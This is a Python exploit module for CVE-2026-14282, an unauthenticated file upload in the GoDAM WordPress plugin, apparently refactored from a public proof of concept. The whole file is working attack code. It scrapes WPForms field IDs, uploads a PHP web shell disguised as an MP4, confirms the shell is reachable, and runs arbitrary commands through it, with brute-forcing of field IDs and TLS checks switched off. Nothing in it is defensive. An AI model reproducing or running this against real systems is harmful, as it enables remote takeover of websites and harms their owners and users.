# -*- coding: utf-8 -*-
# CVE-2026-14282 — GoDAM WordPress Plugin <= 1.12.2 Unauthenticated File Upload -> RCE
# Refactored from nullwhisper PoC. Core logic preserved.
# Usage:
#     from function.cve_2026_14282 import exploit, run
#     r = exploit('https://target.com/page-with-form', command='id')
import re
from urllib.parse import urlsplit, quote
import requests
import urllib3

urllib3.disable_warnings()

CVE_ID = 'CVE-2026-14282'
CVE_NAME = 'GoDAM <= 1.12.2 Unauth File Upload'

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0)"
TIMEOUT = 30
PHP_SHELL = b"<?php echo 'GODAM-RCE-'.php_uname(); @system($_GET['c']??'id'); ?>"


# ────────────── helper functions (dipertahankan dari asli) ──────────────
def _find_godam_forms(session, page_url, timeout=TIMEOUT):
    """Extract WPForms form IDs and GoDAM field IDs from the page."""
    try:
        r = session.get(page_url, headers={"User-Agent": UA}, timeout=timeout, verify=False)
    except Exception:
        return []

    forms = []
    for form_match in re.finditer(
        r'<form[^>]*id="wpforms-form-(\d+)"[^>]*>.*?</form>', r.text, re.S
    ):
        form_html = form_match.group(0)
        form_id = form_match.group(1)
        fields = re.findall(r'<div[^>]*data-field-id="(\d+)"[^>]*class="[^"]*wpforms-field-godam_record[^"]*"', form_html)
        if not fields:
            fields = re.findall(r'class="[^"]*wpforms-field-godam_record[^"]*"[^>]*data-field-id="(\d+)"', form_html)
        if not fields:
            fields = re.findall(r'wpforms-field-godam_record.*?data-field-id="(\d+)"', form_html, re.S)
        if fields:
            forms.append({"form_id": form_id, "field_ids": fields})
    return forms


def _upload_shell(session, page_url, form_id, field_id, filename, timeout=TIMEOUT):
    """Upload a PHP shell through the GoDAM/WPForms file field."""
    files = {
        f"wpforms[fields][{field_id}]": (filename, PHP_SHELL, "video/mp4"),
    }
    data = {
        "wpforms[id]": form_id,
        "wpforms[post_id]": "0",
        "wpforms[submit]": "wpforms-submit",
    }
    try:
        r = session.post(
            page_url, data=data, files=files,
            headers={"User-Agent": UA, "Referer": page_url},
            timeout=timeout, verify=False, allow_redirects=True,
        )
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def _verify_shell(session, base_url, filename, timeout=TIMEOUT):
    """Try to access the uploaded PHP shell."""
    candidates = [
        base_url.rstrip("/") + f"/wp-content/uploads/godam/wpforms/{filename}",
        base_url.rstrip("/") + f"/wp-content/uploads/godam/wpforms/{filename}?c=echo+VERIFIED",
    ]
    for url in candidates:
        try:
            r = session.get(url, headers={"User-Agent": UA}, timeout=timeout, verify=False)
            if r.status_code == 200 and "GODAM-RCE" in r.text:
                return url, r.text
        except Exception:
            continue
    return None, ""


# ────────────── public exec helper ──────────────
def run(shell_url, cmd, timeout=TIMEOUT):
    """Execute a command via the uploaded shell."""
    try:
        cmd_url = f"{shell_url}?c={quote(cmd)}"
        r = requests.get(cmd_url, headers={"User-Agent": UA}, timeout=timeout, verify=False)
        return r.text.strip()
    except Exception as e:
        return f"<cmd error: {e}>"


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, base_url=None, form_id=None, field_id=None,
            filename="godam-shell.php", brute=False, command="id",
            debug=False, timeout=TIMEOUT):
    """
    Exploit CVE-2026-14282 (GoDAM unauthenticated file upload RCE).

    Args:
        target_url : str  — URL halaman yang punya form WPForms GoDAM
        base_url   : str  — WordPress base URL (default: ambil dari target_url)
        form_id    : str  — WPForms form ID manual (skip auto-detect)
        field_id   : str  — GoDAM field ID manual (skip auto-detect)
        filename   : str  — Nama file shell yang di-upload
        brute      : bool — Brute-force field ID 1-20 kalau auto-detect gagal
        command    : str  — Command yang dijalankan setelah RCE
        debug      : bool — Kumpulkan log langkah-langkah
        timeout    : int  — Request timeout

    Returns:
        dict — Kontrak standar (vulnerable, exploited, output, shell_url, dll)
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'godam',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': 'GODAM-RCE',
        'detail': '',
        'exploited': False,
        'log': [],
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res
    
    page = target_url.strip()
    if not page.startswith('http'):
        page = 'https://' + page
    res['target'] = page

    # Tentukan Base URL
    if base_url:
        base = base_url
    else:
        p = urlsplit(page)
        base = f"{p.scheme}://{p.netloc}"
    res['endpoint'] = base

    session = requests.Session()

    _form_id = form_id
    _field_ids = [field_id] if field_id else []
    need_detect = not _form_id or not _field_ids

    if need_detect:
        _step("Detecting WPForms form and GoDAM field...")
        forms = _find_godam_forms(session, page, timeout)
        if forms:
            if not _form_id:
                _form_id = forms[0]["form_id"]
            if not _field_ids:
                _field_ids = forms[0]["field_ids"]
            _step(f"Found form ID {_form_id}, GoDAM field(s): {', '.join(_field_ids)}")
        else:
            if brute and _form_id:
                _field_ids = [str(i) for i in range(1, 21)]
                _step("Falling back to brute-force field IDs 1-20")
            else:
                res['detail'] = 'No GoDAM form found on the page.'
                return res

    if not _form_id:
        res['detail'] = 'Could not determine form ID.'
        return res

    shell_url = None
    for fid in _field_ids:
        _step(f"Trying upload via field {fid}...")
        status, text = _upload_shell(session, page, _form_id, fid, filename, timeout)
        
        if status not in (200, 302):
            _step(f"Upload failed (HTTP {status})")
            continue
            
        url, out = _verify_shell(session, base, filename, timeout)
        if url:
            shell_url = url
            res['vulnerable'] = True
            res['http_status'] = status
            _step(f"Shell uploaded and executed: {url}")
            break
        else:
            _step(f"Shell not reachable for field {fid} (upload may still have succeeded)")

    if not shell_url:
        res['detail'] = 'Could not confirm RCE.'
        return res

    res['shell_url'] = shell_url
    res['exploited'] = True
    res['rce_verified'] = 'YES'
    res['detail'] = 'Shell uploaded and verified'

    if command:
        try:
            cmd_out = run(shell_url, command, timeout)
            res['output'] = cmd_out[:500]
        except Exception as e:
            res['output'] = f'Command execution failed: {e}'

    return res